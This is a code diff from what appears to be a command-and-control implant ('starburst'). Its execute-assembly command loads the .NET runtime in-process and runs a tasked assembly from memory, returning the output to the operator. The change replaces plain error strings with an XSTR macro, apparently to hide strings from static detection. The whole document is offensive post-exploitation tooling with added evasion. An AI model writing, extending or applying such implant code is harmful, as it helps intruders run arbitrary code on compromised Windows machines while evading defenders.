@@ -180,7 +180,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( !asm_data || asm_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no assembly data" ) ) );
+            XSTR( "no assembly data" ) );
         return;
     }
 
@@ -194,7 +194,7 @@ auto declfn starburst::cmd_execute_assembly(
     HANDLE h_read = nullptr, h_write = nullptr;
     if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
+            XSTR( "CreatePipe failed" ) );
         return;
     }
 
@@ -221,7 +221,7 @@ auto declfn starburst::cmd_execute_assembly(
     if ( !ok ) {
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
+            XSTR( "CreateProcessW failed" ) );
         return;
     }
 
@@ -281,7 +281,7 @@ auto declfn starburst::cmd_execute_assembly(
     auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
+            XSTR( "mscoree.dll load failed" ) );
         return;
     }
 
@@ -291,7 +291,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( !pCLRCreateInstance ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
+            XSTR( "CLRCreateInstance not found" ) );
         return;
     }
 
@@ -316,7 +316,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !meta_host ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
+            XSTR( "CLRCreateInstance failed" ) );
         return;
     }
 
@@ -334,7 +334,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !runtime_info ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetRuntime failed" ) ) );
+            XSTR( "GetRuntime failed" ) );
         return;
     }
 
@@ -351,7 +351,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !runtime_host ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetInterface failed" ) ) );
+            XSTR( "GetInterface failed" ) );
         return;
     }
 
@@ -369,7 +369,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !app_domain_unk ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
+            XSTR( "GetDefaultDomain failed" ) );
         return;
     }
 
@@ -385,7 +385,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !app_domain ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "QI _AppDomain failed" ) ) );
+            XSTR( "QI _AppDomain failed" ) );
         return;
     }
 
@@ -394,7 +394,7 @@ auto declfn starburst::cmd_execute_assembly(
     auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n3 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
+            XSTR( "oleaut32 load failed" ) );
         return;
     }
 
@@ -418,7 +418,7 @@ auto declfn starburst::cmd_execute_assembly(
     if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
          !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "oleaut32 API resolution failed" ) ) );
+            XSTR( "oleaut32 API resolution failed" ) );
         return;
     }
 
@@ -429,7 +429,7 @@ auto declfn starburst::cmd_execute_assembly(
     SAFEARRAY* sa_asm = pSafeArrayCreate( VT_UI1, 1, &bounds );
     if ( !sa_asm ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "SafeArrayCreate failed" ) ) );
+            XSTR( "SafeArrayCreate failed" ) );
         return;
     }
 
@@ -446,7 +446,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !assembly ) {
         char err_buf[128] = { 0 };
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "Load_3 failed: 0x" ) ) );
+        str_copy( err_buf, XSTR( "Load_3 failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_buf, hex );
@@ -462,7 +462,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) || !method_info ) {
         char err_buf[128] = { 0 };
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "get_EntryPoint failed: 0x" ) ) );
+        str_copy( err_buf, XSTR( "get_EntryPoint failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_buf, hex );
@@ -567,14 +567,14 @@ auto declfn starburst::cmd_execute_assembly(
 
     if ( FAILED( hr ) ) {
         char err_msg[128] = { 0 };
-        str_copy( err_msg, symbol<char*>( const_cast<char*>( "Invoke_3 failed: 0x" ) ) );
+        str_copy( err_msg, XSTR( "Invoke_3 failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_msg, hex );
 
         if ( output_buf && output_len > 0 ) {
             output_buf[output_len] = '\0';
-            str_concat( err_msg, symbol<char*>( const_cast<char*>( " | " ) ) );
+            str_concat( err_msg, XSTR( " | " ) );
             str_concat( err_msg, reinterpret_cast<char*>( output_buf ) );
             inst.heap_free( output_buf );
         }
@@ -590,7 +590,7 @@ auto declfn starburst::cmd_execute_assembly(
         inst.heap_free( output_buf );
     } else {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "(no output)" ) ) );
+            XSTR( "(no output)" ) );
     }
 }
 
